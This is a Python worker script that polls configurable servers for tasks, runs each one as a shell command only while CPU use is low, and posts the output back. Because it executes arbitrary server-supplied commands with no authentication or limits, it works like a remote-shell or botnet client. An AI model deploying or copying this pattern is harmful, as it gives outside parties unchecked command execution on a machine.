import os
import time
import subprocess
import requests
import psutil

def _load_endpoints():
    env = os.getenv('CLONE_ENDPOINTS')
    if env:
        return [u.strip() for u in env.split(',') if u.strip()]
    url = os.getenv('CLONE_SERVER_URL', 'http://localhost:5000')
    return [url]

ENDPOINTS = _load_endpoints()
CLONE_ID = os.getenv('CLONE_ID', os.uname().nodename)
CPU_THRESHOLD = float(os.getenv('CPU_THRESHOLD', '50'))
CHECK_INTERVAL = float(os.getenv('CHECK_INTERVAL', '10'))


def fetch_task():
    for url in list(ENDPOINTS):
        try:
            resp = requests.get(f"{url}/task/assign", params={'id': CLONE_ID}, timeout=5)
            if resp.ok:
                data = resp.json()
                return data.get('task')
        except Exception as e:
            print(f"error fetching task from {url}: {e}")
            ENDPOINTS.remove(url)
    return None


def report_result(result):
    for url in list(ENDPOINTS):
        try:
            requests.post(f"{url}/task/result", json={'id': CLONE_ID, 'result': result}, timeout=5)
        except Exception as e:
            print(f"error reporting result to {url}: {e}")
            ENDPOINTS.remove(url)


def main():
    while True:
        cpu = psutil.cpu_percent(interval=1)
        if cpu < CPU_THRESHOLD:
            task = fetch_task()
            if task:
                try:
                    output = subprocess.check_output(task, shell=True, text=True, timeout=60)
                except subprocess.CalledProcessError as e:
                    output = e.output
                report_result(output)
        time.sleep(CHECK_INTERVAL)


if __name__ == '__main__':
    main()
